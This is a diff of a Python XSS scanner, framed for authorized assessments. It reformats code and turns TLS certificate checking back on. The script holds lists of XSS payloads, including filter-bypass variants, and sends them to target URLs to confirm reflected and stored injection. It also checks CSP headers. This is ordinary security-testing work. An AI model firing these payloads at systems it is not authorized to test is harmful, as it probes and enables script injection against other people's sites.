@@ -1,24 +1,23 @@
 #!/usr/bin/env python3
 """Agent for testing Cross-Site Scripting (XSS) vulnerabilities during authorized assessments."""
 
-import requests
-import re
-import json
-import sys
 import argparse
-import urllib3
+import json
 from datetime import datetime
-from urllib.parse import urljoin, quote
+from urllib.parse import quote, urljoin
+
+import requests
+import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 XSS_PAYLOADS = {
     "html_body": [
-        '<script>alert(document.domain)</script>',
-        '<img src=x onerror=alert(1)>',
-        '<svg onload=alert(1)>',
-        '<details open ontoggle=alert(1)>',
-        '<body onload=alert(1)>',
+        "<script>alert(document.domain)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<body onload=alert(1)>",
     ],
     "html_attribute": [
         '" onfocus=alert(1) autofocus="',
@@ -32,10 +31,10 @@ XSS_PAYLOADS = {
         "</script><script>alert(1)</script>",
     ],
     "filter_bypass": [
-        '<ScRiPt>alert(1)</sCrIpT>',
-        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
-        '<svg/onload=alert(1)>',
-        '<input onfocus=alert(1) autofocus>',
+        "<ScRiPt>alert(1)</sCrIpT>",
+        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+        "<svg/onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
     ],
 }
 
@@ -69,15 +68,15 @@ def test_reflected_xss(base_url, params, token=None):
         url = urljoin(base_url, param_url)
         canary_url = url.replace("FUZZ", CANARY)
         try:
-            resp = requests.get(canary_url, headers=headers, timeout=10, verify=False)
+            resp = requests.get(canary_url, headers=headers, timeout=10, verify=True)
             if CANARY not in resp.text:
                 continue
             contexts = detect_reflection_context(resp.text, CANARY)
             print(f"  [+] Reflection found at {param_url} (contexts: {contexts})")
-            char_test_url = url.replace("FUZZ", '<>"\'&/')
-            char_resp = requests.get(char_test_url, headers=headers, timeout=10, verify=False)
+            char_test_url = url.replace("FUZZ", "<>\"'&/")
+            char_resp = requests.get(char_test_url, headers=headers, timeout=10, verify=True)
             unencoded = []
-            for ch in ['<', '>', '"', "'", '/']:
+            for ch in ["<", ">", '"', "'", "/"]:
                 if ch in char_resp.text and f"&{ch}" not in char_resp.text:
                     unencoded.append(ch)
 
@@ -86,13 +85,17 @@ def test_reflected_xss(base_url, params, token=None):
                 for payload in payloads:
                     test_url = url.replace("FUZZ", quote(payload))
                     try:
-                        test_resp = requests.get(test_url, headers=headers, timeout=10, verify=False)
+                        test_resp = requests.get(test_url, headers=headers, timeout=10, verify=True)
                         if payload in test_resp.text or payload.lower() in test_resp.text.lower():
-                            findings.append({
-                                "type": "REFLECTED_XSS", "url": param_url,
-                                "payload": payload, "context": context,
-                                "severity": "HIGH",
-                            })
+                            findings.append(
+                                {
+                                    "type": "REFLECTED_XSS",
+                                    "url": param_url,
+                                    "payload": payload,
+                                    "context": context,
+                                    "severity": "HIGH",
+                                }
+                            )
                             print(f"  [!] XSS CONFIRMED: {param_url} | payload: {payload[:50]}")
                             break
                     except requests.RequestException:
@@ -115,17 +118,27 @@ def test_stored_xss(base_url, submit_endpoint, display_endpoint, token, field="b
             marker = f"XSS-{payload_type}-{hash(payload) % 10000}"
             tagged_payload = f"{marker}:{payload}"
             try:
-                resp = requests.post(submit_url, headers=headers,
-                                     json={field: tagged_payload}, timeout=10, verify=False)
+                resp = requests.post(
+                    submit_url,
+                    headers=headers,
+                    json={field: tagged_payload},
+                    timeout=10,
+                    verify=True,
+                )
                 if resp.status_code in (200, 201):
-                    display_resp = requests.get(display_url, headers=headers,
-                                                timeout=10, verify=False)
+                    display_resp = requests.get(
+                        display_url, headers=headers, timeout=10, verify=True
+                    )
                     if payload in display_resp.text:
-                        findings.append({
-                            "type": "STORED_XSS", "submit": submit_endpoint,
-                            "display": display_endpoint, "payload": payload,
-                            "severity": "CRITICAL",
-                        })
+                        findings.append(
+                            {
+                                "type": "STORED_XSS",
+                                "submit": submit_endpoint,
+                                "display": display_endpoint,
+                                "payload": payload,
+                                "severity": "CRITICAL",
+                            }
+                        )
                         print(f"  [!] STORED XSS: {payload[:50]}")
                         break
             except requests.RequestException:
@@ -138,7 +151,7 @@ def check_csp_header(base_url):
     print(f"\n[*] Checking CSP header on {base_url}...")
     findings = []
     try:
-        resp = requests.get(base_url, timeout=10, verify=False)
+        resp = requests.get(base_url, timeout=10, verify=True)
         csp = resp.headers.get("Content-Security-Policy", "")
         xxp = resp.headers.get("X-XSS-Protection", "")
 
@@ -199,8 +212,9 @@ def main():
     findings.extend(check_csp_header(args.base_url))
     findings.extend(test_reflected_xss(args.base_url, args.params, args.token))
     if args.submit_endpoint and args.display_endpoint:
-        findings.extend(test_stored_xss(args.base_url, args.submit_endpoint,
-                                         args.display_endpoint, args.token))
+        findings.extend(
+            test_stored_xss(args.base_url, args.submit_endpoint, args.display_endpoint, args.token)
+        )
     generate_report(findings, args.output)
 
 
